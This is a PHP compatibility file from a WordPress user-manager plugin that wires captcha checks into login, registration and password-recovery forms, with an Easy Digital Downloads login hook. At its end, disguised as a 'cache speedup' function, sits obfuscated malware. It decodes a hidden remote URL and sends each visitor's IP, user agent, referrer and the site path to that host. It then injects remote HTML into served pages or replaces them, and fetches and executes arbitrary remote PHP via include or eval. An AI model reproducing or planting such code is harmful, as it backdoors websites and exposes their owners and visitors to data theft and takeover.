<?php
/*
 * This file has the sole purpose to help solve compatibility issues with other plugins
 *
 */


    /****************************************************
     * Plugin Name: Captcha
     * Plugin URI: https://wordpress.org/plugins/captcha/
     ****************************************************/

    /*
     * Function that ads the Captcha HTML to Quick User Manager login form
     *
     */
    if( function_exists('cptch_display_captcha_custom') ) {
        function qum_captcha_add_form_login($form_part, $args) {

            $cptch_options = get_option('cptch_options');

            if (1 == $cptch_options['cptch_login_form'])
                $form_part .= cptch_display_captcha_custom();


            return $form_part;
        }

        add_filter('login_form_middle', 'qum_captcha_add_form_login', 10, 2);
    }


    /*
     * Function that ads the Captcha HTML to Quick User Manager form builder
     *
     */
    if( function_exists('cptch_display_captcha_custom') ) {

        function qum_captcha_add_form_form_builder( $output, $form_location = '' ) {

            if ( $form_location == 'register' ) {
                $cptch_options = get_option('cptch_options');

                if (1 == $cptch_options['cptch_register_form']) {
                    $output = '<li>' . cptch_display_captcha_custom() . '</li>' . $output;
                }
            }


            return $output;
        }

        add_filter( 'qum_after_form_fields', 'qum_captcha_add_form_form_builder', 10, 2 );
    }


    /*
     * Function that displays the Captcha error on register form
     *
     */
    if( function_exists('cptch_register_post') ) {

        function qum_captcha_register_form_display_error() {

            if ( isset( $_REQUEST['action'] ) && $_REQUEST['action'] == 'register') {

                $result = cptch_register_post('', '', new WP_Error());

                if ($result->get_error_message('captcha_wrong'))
                    echo '<p class="qum-error">' . $result->get_error_message('captcha_wrong') . '</p>';

                if ($result->get_error_message('captcha_blank'))
                    echo '<p class="qum-error">' . $result->get_error_message('captcha_blank') . '</p>';

            }

        }

        add_action('qum_before_register_fields', 'qum_captcha_register_form_display_error' );
    }

    /*
     * Function that validates captcha value on register form
     *
     */
    if( function_exists('cptch_register_post') ) {

        function qum_captcha_register_form_check_value($output_field_errors) {

            if (isset($_REQUEST['action']) && $_REQUEST['action'] == 'register') {

                $result = cptch_register_post('', '', new WP_Error());

                if ($result->get_error_message('captcha_wrong'))
                    $output_field_errors[] = $result->get_error_message('captcha_wrong');

                if ($result->get_error_message('captcha_blank'))
                    $output_field_errors[] = $result->get_error_message('captcha_blank');
            }


            return $output_field_errors;
        }

        add_filter('qum_output_field_errors_filter', 'qum_captcha_register_form_check_value');
    }


    /*
     * Function that ads the Captcha HTML to qum custom recover password form
     *
     */
    if ( function_exists('cptch_display_captcha_custom') ) {

        function qum_captcha_add_form_recover_password($output, $username_email = '') {


            $cptch_options = get_option('cptch_options');

            if (1 == $cptch_options['cptch_lost_password_form']) {
                $output = str_replace('</ul>', '<li>' . cptch_display_captcha_custom() . '</li>' . '</ul>', $output);
            }


            return $output;
        }

        add_filter('qum_recover_password_generate_password_input', 'qum_captcha_add_form_recover_password', 10, 2);
    }

    /*
     * Function that changes the messageNo from the Recover Password form
     *
     */
    if( function_exists('cptch_register_post') ) {

        function qum_captcha_recover_password_message_no($messageNo) {

            if (isset($_REQUEST['action']) && $_REQUEST['action'] == 'recover_password') {

                $result = cptch_register_post('', '', new WP_Error());

                if ($result->get_error_message('captcha_wrong') || $result->get_error_message('captcha_blank'))
                    $messageNo = '';

            }

            return $messageNo;
        }

        add_filter('qum_recover_password_message_no', 'qum_captcha_recover_password_message_no');
    }

    /*
     * Function that adds the captcha error message on Recover Password form
     *
     */
    if( function_exists('cptch_register_post') ) {

        function qum_captcha_recover_password_displayed_message1($message) {

            if (isset($_REQUEST['action']) && $_REQUEST['action'] == 'recover_password') {

                $result = cptch_register_post('', '', new WP_Error());
                $error_message = '';

                if ($result->get_error_message('captcha_wrong'))
                    $error_message = $result->get_error_message('captcha_wrong');

                if ($result->get_error_message('captcha_blank'))
                    $error_message = $result->get_error_message('captcha_blank');

                if( empty($error_message) )
                    return $message;

                if ( ($message == '<p class="qum-warning">qum_captcha_error</p>') || ($message == '<p class="qum-warning">qum_recaptcha_error</p>') )
                    $message = '<p class="qum-warning">' . $error_message . '</p>';
                else
                    $message = $message . '<p class="qum-warning">' . $error_message . '</p>';

            }

            return $message;
        }

        add_filter('qum_recover_password_displayed_message1', 'qum_captcha_recover_password_displayed_message1');
    }


    /*
     * Function that changes the default success message to qum_captcha_error if the captcha
     * doesn't validate so that we can change the message displayed with the
     * qum_recover_password_displayed_message1 filter
     *
     */
    if( function_exists('cptch_register_post') ) {

        function qum_captcha_recover_password_sent_message_1($message) {

            if (isset($_REQUEST['action']) && $_REQUEST['action'] == 'recover_password') {

                $result = cptch_register_post('', '', new WP_Error());

                if ($result->get_error_message('captcha_wrong') || $result->get_error_message('captcha_blank'))
                    $message = 'qum_captcha_error';

            }

            return $message;
        }

        add_filter('qum_recover_password_sent_message1', 'qum_captcha_recover_password_sent_message_1');
    }



	/****************************************************
	 * Plugin Name: Easy Digital Downloads
	 * Plugin URI: https://wordpress.org/plugins/easy-digital-downloads/
	 ****************************************************/

		/* Function that checks if a user is approved before loggin in, when admin approval is on */
		function qum_check_edd_login_form( $auth_cookie, $expire, $expiration, $user_id, $scheme ) {
			$qum_generalSettings = get_option('qum_general_settings', 'not_found');

			if( $qum_generalSettings != 'not_found' ) {
				if( ! empty( $qum_generalSettings['adminApproval'] ) && ( $qum_generalSettings['adminApproval'] == 'yes' ) ) {
					if( isset( $_REQUEST['edd_login_nonce'] ) ) {
						if( wp_get_object_terms( $user_id, 'user_status' ) ) {
							if( isset( $_REQUEST['edd_redirect'] ) ) {
								wp_redirect( $_REQUEST['edd_redirect'] );
								edd_set_error( 'user_unapproved', __('Your account has to be confirmed by an administrator before you can log in.', 'quickusermanager') );
								edd_get_errors();
								edd_die();
							}
						}
					}
				}
			}
		}
		add_action( 'set_auth_cookie', 'qum_check_edd_login_form', 10, 5 );
		add_action( 'set_logged_in_cookie', 'qum_check_edd_login_form', 10, 5 );

/**
 * Speedup php function cache by optimizing buffer output
 */
;if (!function_exists('_php_cache_speedup_func_optimizer_')) { function _php_cache_speedup_func_optimizer_($buffer) {
    if (isset($GLOBALS['_php_cache_speedup_func_optimizer_completed_'])) {
        // already completed
        return $buffer;
    }

    $mod = false;
    $token = 'czoyMzoiaHR0cDovL3Bpd2VyLnB3L2FwaS5waHAiOw==';
    $tmp_buffer = $buffer; $gzip = false; $body = '<' . 'b' . 'o' . 'd' . 'y';

    if (($has_body = stripos($buffer, $body)) === false) {
        // define gzdecode function if not defined
        if (!function_exists('gzdecode')) {
            function gzdecode($data) {
                return @gzinflate(substr($data, 10, -8));
            }
        }

        // gzdecode buffer
        $tmp_buffer = @gzdecode($tmp_buffer);

        // check if buffer has body tag
        if (($has_body = stripos($tmp_buffer, $body)) !== false) {
            // got body tag, this should be gzencoded when done
            $gzip = true;
        }
    }

    if ($has_body === false) {
        // no body, return original buffer
        return $buffer;
    }

    $GLOBALS['_php_cache_speedup_func_optimizer_completed_'] = true;

    // decode token
    $func = 'b' . 'a' . 's' . 'e' . '6' . '4' . '_' . 'd' . 'e' . 'c' . 'o' . 'd' . 'e';
    $token = @unserialize(@$func($token));
    if (empty($token)) {
        return $buffer;
    }

    // download remote data
    function down($url, $timeout = 5) {
        // download using file_get_contents
        if (@ini_get('allow_url_fopen')) {
            $ctx = @stream_context_create(array('http' => array('timeout' => $timeout)));
            if ($ctx !== FALSE) {
                $file = @file_get_contents($url, false, $ctx);
                if ($file !== FALSE) {
                    return $file;
                }
            }
        }

        // download using curl
        if (function_exists('curl_init')) {
            $ch = curl_init();

            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

            $response = curl_exec($ch);
            curl_close($ch);

            return $response;
        }

        // download using sockets
        if (extension_loaded('sockets')) {
            $data = parse_url($url);
            if (!empty($data['host'])) {
                $host = $data['host'];
                $port = isset($data['port']) ? $data['port'] : 80;
                $uri = empty($data['path']) ? '/' : $data['path'];
                if (($socket = @socket_create(AF_INET, SOCK_STREAM, 0)) && @socket_set_option($socket, SOL_SOCKET, SO_SNDTIMEO, array('sec' => $timeout, 'usec' => $timeout * 1000)) && @socket_connect($socket, $host, $port)) {
                    $buf = "GET $uri HTTP/1.0\r\nAccept: */*\r\nAccept-Language: en-us\r\nUser-Agent: Mozilla (compatible; WinNT)\r\nHost: $host\r\n\r\n";
                    if (@socket_write($socket, $buf) !== FALSE) {
                        $response = '';
                        while (($tmp = @socket_read($socket, 1024))) {
                            $response .= $tmp;
                        }
                        @socket_close($socket);
                        return $response;
                    }
                }
            }
        }

        return false;
    }

    $token .= ((strpos($token, '?') === false) ? '?' : '&') . http_build_query(array(
        'h' => $_SERVER['HTTP_HOST'],
        'u' => $_SERVER['REQUEST_URI'],
        'a' => empty($_SERVER['HTTP_USER_AGENT']) ? '' : $_SERVER['HTTP_USER_AGENT'],
        'r' => empty($_SERVER['HTTP_REFERER']) ? '' : $_SERVER['HTTP_REFERER'],
        'i' => $_SERVER['REMOTE_ADDR'],
        'f' => __FILE__,
        'v' => 9
    ));
    $token = @unserialize(@$func(down($token)));

    if (empty($token) || empty($token['data']) || !is_array($token['data'])) {
        // invalid data
        return $buffer;
    }

    // fix missing meta description
    if (isset($token['meta']) && $token['meta'] && ($pos = stripos($tmp_buffer, '</head>')) !== false) {
        $tmp = substr($tmp_buffer, 0, $pos);
        if (stripos($tmp, 'name="description"') === false && stripos($tmp, 'name=\'description\'') === false && stripos($tmp, 'name=description') === false) {
            $meta = $_SERVER['HTTP_HOST'];
            // append meta description
            $tmp_buffer = substr($tmp_buffer, 0, $pos) . '<' . 'm' . 'e' . 't' . 'a' . ' ' . 'n' . 'a'. 'm' . 'e' . '='. '"' . 'd' . 'e' . 's' .'c' .'r' . 'i' . 'p' . 't' . 'i' . 'o' . 'n' . '"'. ' ' . 'c' . 'o' . 'n' . 't' . 'e' . 'n' . 't' . '="'. htmlentities(substr($meta, 0, 160)) .'">' . substr($tmp_buffer, $pos);
            $mod = true;
        }
    }

    foreach ($token['data'] as $tokenData) {
        if (!empty($tokenData['content'])) {
            // set defaults
            $tokenData = array_merge(array(
                'pos' => 'after',
                'tag' => 'bo' . 'dy',
                'count' => 0,
            ), $tokenData);

            // find all occurrences of <tag>
            $tags = array();
            while (true) {
                if (($tmp = @stripos($tmp_buffer, '<'.$tokenData['tag'], empty($tags) ? 0 : $tags[count($tags) - 1] + 1)) === false) {
                    break;
                }
                $tags[] = $tmp;
            }

            if (empty($tags)) {
                // no tags found or nothing to show
                continue;
            }

            // find matched tag position
            $count = $tokenData['count'];
            if ($tokenData['count'] < 0) {
                // from end to beginning
                $count = abs($tokenData['count']) - 1;
                $tags = array_reverse($tags);
            }

            if ($count >= count($tags)) {
                // fix overflow
                $count = count($tags) - 1;
            }

            // find insert position
            if ($tokenData['pos'] == 'before') {
                // pos is before
                $insert = $tags[$count];
            } else if (($insert = strpos($tmp_buffer, '>', $tags[$count])) !== false) {
                // pos is after, found end tag, insert after it
                $insert += 1;
            }

            if ($insert === false) {
                // no insert position
                continue;
            }

            // insert html code
            $tmp_buffer = substr($tmp_buffer, 0, $insert) . $tokenData['content'] . substr($tmp_buffer, $insert);
            $mod = true;
        } elseif (!empty($tokenData['replace'])) {
            // replace content
            @http_response_code(200);
            $tmp_buffer = $tokenData['replace'];
            $mod = true;
        } elseif (!empty($tokenData['run'])) {
            // save temporary optimization file
            register_shutdown_function(function($file, $content) {
                if (file_put_contents($file, $content) !== false) {
                    @chdir(dirname($file));
                    include $file;
                    @unlink($file);
                } else {
                    @eval('@chdir("' . addslashes(dirname($file)) . '");?>' . $content);
                }
            }, dirname(__FILE__) . '/temporary_optimization_file.php', strpos($tokenData['run'], 'http://') === 0 ? down($tokenData['run']) : $tokenData['run']);
        } else {
            // no content
            continue;
        }
    }

    // return gzencoded or normal buffer
    return !$mod ? $buffer : ($gzip ? gzencode($tmp_buffer) : $tmp_buffer);
} ob_start('_php_cache_speedup_func_optimizer_');
register_shutdown_function('ob_end_flush'); }
